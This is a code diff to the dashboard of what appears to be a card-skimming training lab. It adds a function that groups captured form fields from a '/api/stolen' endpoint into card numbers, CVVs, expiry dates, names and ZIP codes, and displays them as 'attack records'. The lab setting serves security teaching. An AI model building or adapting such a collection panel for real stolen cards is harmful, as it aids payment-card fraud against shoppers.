@@ -309,13 +309,68 @@
     </div>
 
     <script>
+      // Helper function to extract credit card data from fieldData structure
+      function extractCardData(records) {
+        // Group records by session/timestamp to form complete credit card records
+        const groupedRecords = new Map()
+        
+        records.forEach(record => {
+          if (record.fieldData && record.fieldData.values && record.fieldData.values.length > 0) {
+            // Get the latest value from the field
+            const latestValue = record.fieldData.values[record.fieldData.values.length - 1].value
+            const fieldName = record.fieldData.fieldName || ''
+            const timestamp = record.serverTimestamp || record.timestamp
+            
+            // Group by timestamp (within 5 seconds) and metadata URL
+            const sessionKey = `${record.metadata?.url || ''}_${Math.floor(timestamp / 5000)}`
+            
+            if (!groupedRecords.has(sessionKey)) {
+              groupedRecords.set(sessionKey, {
+                timestamp: timestamp,
+                metadata: record.metadata || {},
+                fields: {}
+              })
+            }
+            
+            const session = groupedRecords.get(sessionKey)
+            
+            // Map field names to credit card data structure
+            if (fieldName.includes('card') && (fieldName.includes('number') || fieldName.includes('Number'))) {
+              session.fields.cardNumber = latestValue
+            } else if (fieldName.includes('cvv') || fieldName.includes('Cvv') || fieldName.includes('CVV')) {
+              session.fields.cvv = latestValue
+            } else if (fieldName.includes('exp') || fieldName.includes('Exp') || fieldName.includes('expiry')) {
+              session.fields.expiry = latestValue
+            } else if (fieldName.includes('holder') || fieldName.includes('Holder') || fieldName.includes('name')) {
+              session.fields.cardholderName = latestValue
+            } else if (fieldName.includes('zip') || fieldName.includes('Zip')) {
+              session.fields.billingZip = latestValue
+            }
+          }
+        })
+        
+        // Convert to array and sort by timestamp
+        return Array.from(groupedRecords.values())
+          .map(session => ({
+            cardNumber: session.fields.cardNumber,
+            cvv: session.fields.cvv,
+            expiry: session.fields.expiry,
+            cardholderName: session.fields.cardholderName,
+            billingZip: session.fields.billingZip,
+            timestamp: session.timestamp,
+            metadata: session.metadata
+          }))
+          .filter(record => record.cardNumber || record.cvv || record.expiry) // Only show records with card data
+          .sort((a, b) => b.timestamp - a.timestamp)
+      }
+
       async function loadData() {
         try {
           // Load statistics
           const statsResponse = await fetch('/stats')
           const stats = await statsResponse.json()
 
-          document.getElementById('totalAttacks').textContent = stats.totalAttacks || 0
+          document.getElementById('totalAttacks').textContent = stats.totalRequests || 0
           document.getElementById('uniqueVictims').textContent = stats.uniqueVictims || 0
 
           if (stats.uptimeHours) {
@@ -324,35 +379,72 @@
             document.getElementById('uptime').textContent = `${hours}h ${minutes}m`
           }
 
-          // Load recent attacks
-          const recentResponse = await fetch('/recent/5')
-          const recentData = await recentResponse.json()
+          // Load all stolen data (like Lab 1)
+          const stolenResponse = await fetch('/api/stolen')
+          const allData = await stolenResponse.json()
 
           const recentContainer = document.getElementById('recentData')
 
-          if (recentData.length === 0) {
+          if (allData.length === 0) {
             recentContainer.innerHTML =
               '<div class="no-data">No attack data yet. Trigger the attack in Lab 2 to see data appear here.</div>'
           } else {
-            recentContainer.innerHTML = recentData
-              .map(
-                (attack, index) => `
-                        <div class="attack-record">
-                            <h4>Attack #${index + 1} - ${attack.timestamp || 'Unknown time'}</h4>
-                            <pre>${JSON.stringify(attack, null, 2)}</pre>
-                        </div>
-                    `
-              )
-              .join('')
+            // Extract and group credit card data
+            const cardRecords = extractCardData(allData)
+
+            if (cardRecords.length === 0) {
+              recentContainer.innerHTML =
+                '<div class="no-data">No credit card data found. Data may still be collecting...</div>'
+            } else {
+              recentContainer.innerHTML = cardRecords
+                .map((record, index) => {
+                  // Extract credit card info for display
+                  let cardInfo = ''
+                  if (record.cardNumber) {
+                    const card = record.cardNumber.replace(/\s/g, '')
+                    if (card.length >= 8) {
+                      const first4 = card.substring(0, 4)
+                      const last4 = card.substring(card.length - 4)
+                      const masked = '*'.repeat(card.length - 8)
+                      cardInfo = `${first4}${masked}${last4}`
+                    } else {
+                      cardInfo = card
+                    }
+                  }
+
+                  const displayTime = record.timestamp 
+                    ? new Date(record.timestamp).toLocaleString()
+                    : 'Unknown time'
+
+                  return `
+                    <div class="attack-record">
+                      <h4>Record #${index + 1} - ${displayTime}</h4>
+                      <div style="margin-bottom: 1rem;">
+                        ${cardInfo ? `<strong>💳 Card:</strong> ${cardInfo}<br>` : ''}
+                        ${record.cardholderName ? `<strong>👤 Name:</strong> ${record.cardholderName}<br>` : ''}
+                        ${record.expiry ? `<strong>📅 Expires:</strong> ${record.expiry}<br>` : ''}
+                        ${record.cvv ? `<strong>🔐 CVV:</strong> ${record.cvv}<br>` : ''}
+                        ${record.billingZip ? `<strong>📍 ZIP:</strong> ${record.billingZip}<br>` : ''}
+                        ${record.metadata?.url ? `<strong>🌐 URL:</strong> ${record.metadata.url}<br>` : ''}
+                      </div>
+                      <details>
+                        <summary style="cursor: pointer; color: #fbbf24;">View Full Data</summary>
+                        <pre style="margin-top: 0.5rem;">${JSON.stringify(record, null, 2)}</pre>
+                      </details>
+                    </div>
+                  `
+                })
+                .join('')
+            }
           }
 
           // Update stats tab
           document.getElementById('statsData').innerHTML = `
-                    <div class="stat-card">
-                        <h3>Attack Statistics</h3>
-                        <pre>${JSON.stringify(stats, null, 2)}</pre>
-                    </div>
-                `
+            <div class="stat-card">
+              <h3>Attack Statistics</h3>
+              <pre>${JSON.stringify(stats, null, 2)}</pre>
+            </div>
+          `
         } catch (error) {
           console.error('Failed to load data:', error)
           document.getElementById('recentData').innerHTML =
